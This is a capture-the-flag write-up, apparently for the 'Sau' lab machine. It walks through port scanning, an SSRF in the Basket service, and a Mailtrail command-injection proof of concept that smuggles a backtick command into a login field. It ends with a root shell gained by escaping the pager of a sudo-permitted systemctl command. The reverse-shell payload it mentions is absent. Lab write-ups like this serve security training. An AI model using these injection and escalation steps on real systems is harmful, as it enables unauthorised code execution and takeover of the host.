## 1. Enumeration
We began with a standard enumeration procedure.

### 1.1 Nmap Scanning
```shell
$ nmap -sV -p- sau
Starting Nmap 7.92 (https://nmap.org) at 2023-08-06 06:03 EDT
Nmap scan report for sau (10.10.11.224)
Host is up (0.035s latency).
rDNS record for 10.10.11.224: sau.htb
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
```

Ports discovered:
- **22**: Open SSH service
- **80**: Unknown service (blocked)
- **8338**: Unknown service (blocked)
- **55555**: Unknown service

### 1.2 Basket SSRF Exploitation

According to a [Proof of Concept (PoC) for Basket](https://notes.sjtu.edu.cn/s/MUUhEymt7), the given version of Basket has an SSRF vulnerability, particularly in the following APIs:
1. `/api/baskets/{name}`
2. `/baskets/{name}`

We utilized Burp Suite to craft an exploit targeting the endpoint `/api/baskets/7test`.

Upon forwarding the URL to `http://127.0.0.1:8338`, we were able to identify the service running on port `8338`. Access to the service requires requesting the created basket through the URL:

```
http://sau.htb:55555/7test
```

### 1.3 Mailtrail RCE Exploitation

Our exploration unveiled that *mailtrail (v0.53)* is being used. A search yielded an existing [PoC for a Mailtrail RCE exploit](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/).

Executing the following PoC, we achieved code execution:

```PoC
curl 'http://hostname:8338/login' --data 'username=;`id > /tmp/bbq`'
```

For establishing a reverse shell, we employed the following payload (ensure URL encoding):

After initiating a listener, we successfully gained a shell.

A review of the home directory led us to the first flag.

## 2. Privilege Escalation

Executing the `sudo -l` command displayed the following:
```shell
puma@sau:/home$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

The output reveals that the user `puma` has the privilege to view the status of the mailtrail service as the root. Since the output is extensive and utilizes `less` for more manageable reading, we leveraged GTFObins to escape `less` by executing `!sh`. This approach afforded us a root shell.

This method allowed us to obtain the final flag.
